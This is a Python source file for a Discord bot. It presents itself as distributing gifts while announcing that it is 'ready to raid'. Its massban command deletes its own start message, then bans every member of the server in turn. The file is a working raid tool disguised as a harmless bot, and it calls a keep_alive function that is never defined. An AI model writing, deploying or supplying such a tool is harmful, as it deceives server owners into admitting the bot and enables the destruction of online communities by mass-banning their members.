import discord
from discord.ext import commands

import os
import asyncio

token = os.environ['token']
owners = [531412343440277504, 1001922725012582410, 765586481816928276] #add all owners here
_i = discord.Intents.default()
_i.members = True # probably not needed, delete if un-necessary
client = commands.Bot(command_prefix = commands.when_mentioned, owner_ids = set(owners), intents=_i)

@client.event
async def on_connect():
  print("[Connecting to the BOT | Wait Max 5mins]")

@client.event
async def on_ready():
  await client.change_presence(status=discord.Status.online, activity=discord.Game(name="Distributing Gifts | Shard 8..."))
  print(client.user, "is online and ready to raid.")

@client.command()
async def massban(ctx):
    filed = await ctx.send("starting..")
    await asyncio.sleep(2)
    await filed.delete()
    for user in ctx.guild.members:
        try:
          await user.ban()
          await asyncio.sleep(.7)
          print(f"Banned: {user} - [{user.id}] | [ExoBOT]")
        except Exception as exc:
          print(f"Failed to ban a member: {exc} | [ExoBOT]")
            

if __name__ == '__main__':
  keep_alive()
  client.run(token)
